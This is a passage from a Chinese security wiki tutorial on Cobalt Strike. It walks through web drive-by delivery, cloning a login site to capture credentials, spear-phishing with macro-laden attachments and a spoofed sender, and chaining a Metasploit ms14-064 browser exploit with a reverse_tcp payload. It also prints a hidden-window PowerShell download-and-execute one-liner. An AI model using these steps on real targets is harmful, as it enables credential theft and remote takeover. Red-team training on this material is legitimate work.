+<p>然后将生成的beacon.exe文件上传到目标机器上执行即可成功上线。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/46.png"></p>
+<h3 id="3-4-用户驱动的Web交付攻击"><a href="#3-4-用户驱动的Web交付攻击" class="headerlink" title="3.4 用户驱动的Web交付攻击"></a>3.4 用户驱动的Web交付攻击</h3><p>用户驱动Web交付攻击User-Driven Web Drive-by Attacks功能打开位置：Attacks –&gt; Web Drive-by</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/25.png"></p>
+<p>1、Java 签名 applet 攻击</p>
+<p>java 签名 applet 攻击Java Signed Applet Attack会启动一个Web服务以提供自签名Java Applet的运行环境，浏览器会要求用户授予applet运行权限，如果用户同意则实现控制，但目前该攻击方法已过时。</p>
+<p>2、Java 智能 Applet 攻击</p>
+<p>Java 智能 Applet 攻击Java Smart Applet Attack会自动检测Java版本并利用已知的漏洞绕过安全沙箱，但CS官方称该攻击的实现已过时，在现在的环境中无效。</p>
+<p>3、脚本化 Web 交付</p>
+<p>脚本化 Web 交付Scripted Web Delivery 为payload提供web服务以便于下载和执行，类似于MSF的Script Web Delivery</p>
+<p>4、托管文件</p>
+<p>托管文件Host File通过Attacks –&gt; Web Drive-by –&gt; Host File进行配置，攻击者可以通过这个功能将文件上传到CS服务端上，从而进行文件托管。</p>
+<p>如果想删除上传到CS服务端上的文件，可以到Attacks –&gt; Web Drive-by –&gt; Manage下进行删除。</p>
+<p>如果想查看谁访问了这些文件，可以到View –&gt; Web Log下进行查看。</p>
+<h3 id="3-5-钓鱼模块"><a href="#3-5-钓鱼模块" class="headerlink" title="3.5 钓鱼模块"></a>3.5 钓鱼模块</h3><h4 id="3-5-1-Manage"><a href="#3-5-1-Manage" class="headerlink" title="3.5.1 Manage"></a>3.5.1 Manage</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Manage。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/47.png"></p>
+<p>该模块可以查询CS服务端，现在能使用的模块代码。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/48.png"></p>
+<h4 id="3-5-2-System-Profiler"><a href="#3-5-2-System-Profiler" class="headerlink" title="3.5.2 System Profiler"></a>3.5.2 System Profiler</h4><p>点击Attacks–&gt;Web Drive-by–&gt;System Profiler。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png"></p>
+<p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png"></p>
+<p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png"></p>
+<p>注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p>
+<h4 id="3-5-3-Clone-Site"><a href="#3-5-3-Clone-Site" class="headerlink" title="3.5.3 Clone Site"></a>3.5.3 Clone Site</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Clone Site。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/49.png"></p>
+<p>填写需要克隆的网站url地址、本地的url地址、以及对应的端口号即可，这里记得要开启键盘记录。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/50.png"></p>
+<p>点击Clone会生成一个链接。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/51.png"></p>
+<p>访问此链接与克隆的网址完全一致。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/52.png"></p>
+<p>将生成的链接发送给目标用户，若目标用户输入账号及密码进行登录，我们就可以在View–&gt;Web Log中得到用户输入的内容。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/53.png"></p>
+<h4 id="3-5-4-Host-File"><a href="#3-5-4-Host-File" class="headerlink" title="3.5.4 Host File"></a>3.5.4 Host File</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Host File。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/54.png"></p>
+<p>上传文件artifact.exe，填入本地的URL、Host及端口即可。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/55.png"></p>
+<p>点击launch生成下载链接。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/56.png"></p>
+<p>将生成的下载链接发送给目标用户，若目标用户访问链接并运行了下载文件。目标主机就会成功上线。</p>
+<h4 id="3-5-5-Clone-Site-Host-File"><a href="#3-5-5-Clone-Site-Host-File" class="headerlink" title="3.5.5 Clone Site + Host File"></a>3.5.5 Clone Site + Host File</h4><p>网站下载模块也可以与网站克隆模块进行组合使用，具体如下。</p>
+<p>首先克隆一个网站，然后填入需要克隆的URL地址，然后在Attack中添加刚刚生成的下载链接即可。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/57.png"></p>
+<p>点击Clone，会生成一个链接。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/58.png"></p>
+<p>将生成的链接发送给目标用户，在目标用户访问时会提示是否下载qq.exe文件，当客户端下载并点击运行。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/59.png"></p>
+<p>Cobalt Strike监听到有受害人主机就会成功上线。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/60.png"></p>
+<h4 id="3-5-6-Clone-Site-MSF"><a href="#3-5-6-Clone-Site-MSF" class="headerlink" title="3.5.6 Clone Site + MSF"></a>3.5.6 Clone Site + MSF</h4><p>这里我们使用 metasploit中的ms14-064溢出漏洞与Cobalt Strik进行钓鱼攻击。具体步骤如下：</p>
+<p>打开metasploit，使用ms14-064模块，并如下配置参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">set SRVHOST 10.251.0.33</span><br><span class="line">set SRVPORT 8080</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 10.251.0.33</span><br><span class="line">set lport 6666</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+
+<p>最后运行exploit -j，-j 是指作为job开始运行，即在后台运行。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/61.png"></p>
+<p>打开CS中的Clone Site模块，输入需要克隆的网站地址及本地的URL等信息。然后在Attack中填入刚刚生成的溢出利用代码。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/62.png"></p>
+<p>然后通过Clone生成一个链接，将链接发送给目标用户。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/63.png"></p>
+<p>若目标用户使用IE浏览器访问链接，便会返回meterpreter通道。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/64.png"></p>
+<h4 id="3-5-7-Spear-Phish"><a href="#3-5-7-Spear-Phish" class="headerlink" title="3.5.7 Spear Phish"></a>3.5.7 Spear Phish</h4><p>Spear Phish又叫鱼叉式网络钓鱼（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络钓鱼攻击。</p>
+<p>由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织成员，故受窃信息已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密。</p>
+<p>网络钓鱼是指诱导人们连接那些黑客已经锁定的目标。这种攻击方法的成功率很高，也非常常见。点击链接、打开表格或者连接其他一些文件都会感染病毒。一次简单的点击相当于为攻击者开启了一扇电子门，这样他就可以接触到你的内部弱点了。因为你已经同意他进入，他能够接触弱点，然后挖掘信息和授权连接。</p>
+<p>用CS进行钓鱼需要四个步骤：</p>
+<p>1、创建一个目标清单</p>
+<p>2、制作一个邮件模板或者使用之前制作好的模板</p>
+<p>3、选择一个用来发送邮件的邮件服务器</p>
+<p>4、发送邮件</p>
+<p>点击Attacks–&gt;Spear Phish。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/65.png"></p>
+<p>下面简单介绍一下需要配置的一些参数。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/66.png"></p>
+<p>targets是要发送邮箱地址的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123123@qq.com</span><br><span class="line">admin@qq.com</span><br><span class="line">admin@163.com</span><br></pre></td></tr></table></figure>
+
+<p>template 是要发送邮件的模板，<strong>这个可以在个人邮箱中导出一个即可</strong></p>
+<p>attachment 放入我们制作好的宏病毒</p>
+<p>embed url 填写我们制作好的钓鱼网站</p>
+<p>Mail Server 填写本地搭建或者网上公开使用的smtp服务器</p>
+<p>Bounce To 模仿发件人，自己添写即可</p>
+<p>首先先要创建一个文件，用于存放要进行钓鱼攻击的邮箱。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/67.png"></p>
+<p>然后再看看怎么导出模板文件，具体步骤如下。</p>
+<p>1.打开qq邮箱，选择需要导出的模板文件，这里我以<strong>【X情报社区】积分即将下线提醒</strong>的邮件为例。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/68.png"></p>
+<p>2.选择导出为eml文件。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/69.png"></p>
+<p>3.然后将导出的文件保存到指定路径即可。</p>
+<p>4.开启SMTP服务器</p>
+<p>再导出模板文件以后，我们需要先开启SMTP服务器，这里以网易邮箱为例。在<a target="_blank" rel="external nofollow noopener noreferrer" href="https://mail.163.com/%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%AA163%E9%82%AE%E7%AE%B1%E3%80%82">https://mail.163.com/注册一个163邮箱。</a></p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/70.png"></p>
+<p>登陆邮箱，开启smtp服务。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/75.png"></p>
+<p>在开启smtp服务时，系统会要求你发送一条短信。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/76.png"></p>
+<p>在发送完短信以后，系统会给我们一个授权密码，用于在第三方服务器上使用smtp服务。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/77.png"></p>
+<p>最后通过Clone Site创建一个钓鱼网站，进行钓鱼攻击，这里以克隆tom邮箱为例。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/78.png"></p>
+<p>准备就绪，现在开始制作钓鱼邮件，填入需要进行填写的内容。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/79.png"></p>
+<p>查看send email，可以发现邮件成功发送。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/80.png"></p>
+<p>这时候打开邮箱，也可以看到成功收到了邮件。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/81.png"></p>
+<p>这时候若目标用户下载附件并打开，且在office开启了宏功能。主机就会成功上线。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/82.png"></p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/83.png"></p>
+<p>在用户点击任意链接后，就会跳转到我们所创建的钓鱼网站，并会提示是否下载qq.exe。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/84.png"></p>
+<p>若用户点击保存并运行，主机也会成功上线。而且如果目标主机在登陆框中输入了用户名密码，输入的内容也将被我们所得到。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/85.png"></p>
+<h4 id="3-5-8-Scripted-Web-Delivery（S）"><a href="#3-5-8-Scripted-Web-Delivery（S）" class="headerlink" title="3.5.8 Scripted Web Delivery（S）"></a>3.5.8 Scripted Web Delivery（S）</h4><p>点击Attacks–&gt;Web Drive-by–&gt;Scripted Web Delivery（S）</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/71.png"></p>
+<p>设置监听器，选择需要使用的payload类型，这里以powershell为例。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/72.png"></p>
+<p>点击Launch后，会生成一段powershell利用代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/73.png"></p>
+<p>在目标机器上执行这段代码，就会从服务器上下载后门文件，主机就会成功上线。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/74.png"></p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<ul>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://teamssix.com/year/201023-192553.html">https://teamssix.com/year/201023-192553.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/">https://blog.cobaltstrike.com/2014/09/09/infrastructure-for-ongoing-red-team-operations/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></li>
+</ul>
+</blockquote>
+
+            </div>
+        
+        <footer class="article-footer">
+        </footer>
+    </div>
+</article>
+
+
+    
+<nav id="article-nav">
+    
+        <a href="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Newer</strong>
+            <div class="article-nav-title">
+                
+                    1-Cobalt Strike基础中篇
+                
+            </div>
+        </a>
+    
+    
+        <a href="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">Older</strong>
+            <div class="article-nav-title">Oracle Database 11g Wrap加密解密分析</div>
+        </a>
+    
+</nav>
+
+
+
+
+
+    
+    
+
+
+
+
+<!-- baidu url auto push script -->
+<script type="text/javascript">
+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            Tahir &copy; 2021 
+            <a rel="external nofollow noopener noreferrer" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png"></a>
+            <br> Powered by <a href="http://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. Theme - <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/zthxxx/hexo-theme-Wikitten">wikitten</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
